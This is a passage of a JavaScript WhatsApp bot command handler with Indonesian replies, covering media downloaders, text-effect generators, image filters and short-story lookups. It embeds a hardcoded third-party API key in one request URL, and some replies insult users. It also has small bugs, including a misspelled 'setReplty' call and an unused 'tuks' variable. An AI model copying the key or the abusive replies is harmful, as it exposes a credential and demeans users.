if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukan link youtube')
if (q.includes('https://youtube.com/channel/')) return setReply('Goblok itu bukan link vidio bangsat')
setReply('*Scrapping...*')
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (q.includes('https://youtu.be/')) {
var videoId = q.replace('https://youtu.be/', '')
} else if (q.includes('https://youtube.com/watch?v=')) {
var videoId = q.split('=')[1]
} else if (q.includes('https://youtube.com/shorts/')) {
var videoId = q.replace('https://youtube.com/shorts/', '')
} else {
return setReply('Link salah')
}
let link = `https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
if (anu.all.length == '0') return setReply('Musik tidak di temukan')
try {
var foto = `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg`
} catch (err) {
var foto = anu.all[0].image
}
try {
let info = await ytdl.getInfo(link)
let format = ytdl.filterFormats(info.formats, 'audioonly')
if (Number(format.contentLength) > 20000000) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
let teks = `*YOUTUBE AUDIO DOWNLOADER*

📂 Title : ${info.videoDetails.title}
📄 Size : ${FileSize(format[0].contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
📊 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
👤 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await Araa.sendMessage(from, { image: { url: foto }, caption: teks }, { quoted: m })
downloadMp3(q)
} catch (err) {
setReply(err)
}
}
break
case 'ytmp4':
try {
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (q.includes('https://youtube.com/channel/')) return setReply('Goblok itu bukan link vidio bangsat')
setReply('*Scrapping...*')
if (q.includes('https://youtu.be/')) {
var videoId = q.replace('https://youtu.be/', '')
} else if (q.includes('https://youtube.com/watch?v=')) {
var videoId = q.split('=')[1]
} else if (q.includes('https://youtube.com/shorts/')) {
var videoId = q.replace('https://youtube.com/shorts/', '')
} else {
return setReply('Link salah')
}
let link = `https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
if (anu.all.length == '0') return setReply('Video tidak di temukan')
let info = await ytdl.getInfo(link)
let format = ytdl.chooseFormat(info.formats, { quality: '18' })
if (Number(format.contentLength) > 40000000) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
let teks = `*YOUTUBE VIDEO DOWNLOADER*

📂 Title : ${anu.all[0].title}
💾 Ext : 360p
📄 Size : ${FileSize(format.contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
🌎 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
📹 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await Araa.sendMessage(from, { image: { url: anu.all[0].image }, caption: teks }, { quoted: m })
downloadMp4(q)
} catch (err) {
setReply(`${err}`)
}
break
case 'mediafire':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (q.startsWith('https://www.mediafire.com')) {
let nana = await mediafiredl(q)
if (nana.filename == '') return setReply('Error itu bukan file, kalo ga tau cara make mediafire mending ga usah make')
console.log(nana)
let tuks = `
Data succesfull obtained

File Name : ${nana.filename}
File Size : ${nana.filesizeH}
Upload : ${nana.aploud}
`
await setReply(tuks)
if (nana.filesize > 50000 && !isOwner) {
if (sender.startsWith('62')) {
let tuks = 'Kamu telah di banned\nkarena menyalah gunakan\nfitur mediafire!'
} else {
let tuks = 'You have been banned\nfor abusing the mediafire feature'
}
addBanned(pushname, calender, senderNumber, ban)
await setReply('File size melebihi batas,\nbatas yang di tentukan adalah 50mb')
await setReply(tuks)
return
}
await Araa.sendMedia(from, nana.url, m, { fileName: nana.filename })
} else {
setReply('Link Invalid')
}
}
break
case 'githubdl':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q.includes('|')) return setReply(`Contoh ${prefix}${command}githubdl username|repository`)
let url = `https://github.com/${q.split('|')[0]}/${q.split('|')[1]}/archive/refs/heads/master.zip`
console.log('Done')
setReply(`Waiting for compress to zip`)
await Araa.sendMedia(from, url, m, { fileName: q.split('|')[1] })
}
break
case 'gitclone':
try {
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
if (!regex.test(q)) return setReply('link salah!')
let [, user, repos] = q.match(regex) || []
let repo = repos.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repos}/zipball`
let filename = (await fetch(url, { method: 'HEAD' })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
setReply(`*Mohon tunggu, sedang mengirim repository..*`)
await Araa.sendMedia(from, url, m, { fileName: filename })
} catch (err) {
setReply(mess.error.link)
}
break
case 'igstory':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`*Perintah ini untuk mengunduh postingan instagram story*\n\nContoh:\n${prefix + command} alinursetiawan24`)
let res = await fetch(`https://megayaa.herokuapp.com/api/igstori?username=${q}`)
if (!res.ok) return setReply('Error')
let json = await res.json()
if (!json.status) return setReply(json)
await setReplty('Sedang di proses..')
for (let { url, type } of json.data) {
await delay(2000)
Araa.sendMedia(from, url, m, { caption: 'Nih' })
}
}
break
case 'fb':
try {
let { MessageType } = require('@adiwajshing/baileys')
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!args[0]) return setReply('Putting *URL* Facebook..')
if (!args[0].includes('facebook')) return setReply(`Url is wrong..\n\n*Example:*\n${prefix}fb https://www.facebook.com/juankcortavarriaoficial/videos/218237676749570/`)
let res = await fetch(`https://masgimenz.my.id/facebook/?url=` + args[0])
let json = await res.json()
let url = json.videoUrl
setReply('Sedang diproses...')
if (url) await Araa.sendMedia(from, url, m, { caption: 'Nih' })
else setReply('Link download tidak ditemukan')
} catch (e) {
let res = await fetch(`https://api.neoxr.eu.org/api/fb?url=${args[0]}&apikey=obSw1DxesD`)
let json = await res.json()
if (!json.status) setReply(json)
await setReply('Sedang di proses..')
await Araa.sendMedia(from, json.data[1].url, m, { caption: 'Nih' })
}
break
//================================================================================\\
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let sound = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
Araa.sendMessage(from, { audio: sound, mimetype: 'audio/mp4', ptt: true }, { quoted: setQuoted })
break
//================================================================================\\
case 'blackping':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/create-blackpink-logo-style-online-1001.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'glitch1':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/create-impressive-glitch-text-effects-online-1027.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'glitch2':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
onlyWait()
let teks1 = q.split('|')[0]
let teks2 = q.split('|')[1]
textpro('https://textpro.me/create-a-glitch-text-effect-online-free-1026.html', [`${teks1}`, `${teks2}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'glitch3':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
onlyWait()
let teks1 = q.split('|')[0]
let teks2 = q.split('|')[1]
textpro('https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html', [`${teks1}`, `${teks2}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'lion':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
onlyWait()
let teks1 = q.split('|')[0]
let teks2 = q.split('|')[1]
textpro('https://textpro.me/create-lion-logo-mascot-online-938.html', [`${teks1}`, `${teks2}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case '3dspace':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
onlyWait()
let teks1 = q.split('|')[0]
let teks2 = q.split('|')[1]
textpro('https://textpro.me/create-space-3d-text-effect-online-985.html', [`${teks1}`, `${teks2}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case '3dneon':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/create-3d-neon-light-text-effect-online-1028.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'neon':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/neon-text-effect-online-879.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'greenneon':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/green-neon-text-effect-874.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'bokeh':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/bokeh-text-effect-876.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'hollographic':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/holographic-3d-text-effect-975.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'bear':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
let teks1 = q.split('|')[0]
let teks2 = q.split('|')[1]
textpro('https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html', [`${teks1}`, `${teks2}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'wolf':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
let teks1 = q.split('|')[0]
let teks2 = q.split('|')[1]
textpro('https://textpro.me/create-wolf-logo-galaxy-online-936.html', [`${teks1}`, `${teks2}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'joker':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/create-logo-joker-online-934.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'dropwater':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/dropwater-text-effect-872.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'neonlight':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'thewall':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/break-wall-text-effect-871.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'natural':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/natural-leaves-text-effect-931.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'carbon':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/carbon-text-effect-833.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'pencil':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/create-a-sketch-text-effect-online-1044.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
break
case 'luxury':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/create-a-3d-luxury-metallic-text-effect-for-free-1071.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'whitegold':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/elegant-white-gold-3d-text-effect-online-free-1070.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'lightglow':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'arcane':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/create-text-effects-arcane-tv-series-online-1067.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'neonlight':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/neon-light-glitch-text-generator-online-1063.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'valentine':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/create-neon-light-on-brick-wall-online-1062.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'glowingneon':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case 'colorled':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro('https://textpro.me/color-led-display-screen-text-effect-1059.html', [`${q}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
case '3dretro':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
onlyWait()
let teks1 = q.split('|')[0]
let teks2 = q.split('|')[1]
textpro('https://textpro.me/create-3d-retro-text-effect-online-free-1065.html', [`${teks1}`, `${teks2}`])
.then((data) => Araa.sendMedia(from, data, setQuoted, { caption: 'Nih' }))
.catch((err) => console.log(err))
}
break
//================================================================================\\
case 'approved':
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'greyscale':
case 'glitch':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
case '3000years':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedImage) {
try {
onlyWait()
let ahah = await Araa.downloadAndSaveMediaMessage(quoted)
let owgi = await TelegraPh(ahah)
let ini_gen = `${command}`
ameApi.generate(ini_gen, { url: owgi }).then((gambar) => {
Araa.sendMessage(from, { image: gambar, caption: 'Nih' }, { quoted: m })
fs.unlinkSync(ahah)
})
} catch (err) {
console.log(err)
}
} else if (isQuotedTag || isQuotedReply) {
onlyWait()
let ghost = users
let oppp = await Araa.profilePictureUrl(ghost, 'image').catch((_) => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let ini_gen = `${command}`
ameApi
.generate(ini_gen, {
url: oppp,
})
.then((gambar) => {
Araa.sendMessage(from, { image: gambar, caption: 'Nih' }, { quoted: m })
})
.catch((err) => {
setReply(`${err}`)
})
} else {
setReply('Tag atau Reply targetnya')
}
break
//================================================================================\\
case 'cerpen-anak':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`anak`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasadaerah':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`bahasa daerah`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasainggris':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`bahasa Inggris`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasajawa':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`bahasa jawa`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasasunda':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`bahasa sunda`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-budaya':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`budaya`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cinta':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`cinta`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaislami':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`cinta islami`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintapertama':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`cinta pertama`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaromantis':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`cinta romantis`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasedih':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`cinta sedih`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasegitiga':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`Cinta segitiga`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasejati':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`cinta sejati`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-galau':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`galau`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-gokil':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`gokil`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-inspiratif':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`inspiratif`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-jepang':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`jepang`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kehidupan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`kehidupan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-keluarga':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`keluarga`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kisahnyata':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`kisah nyata`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-korea':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
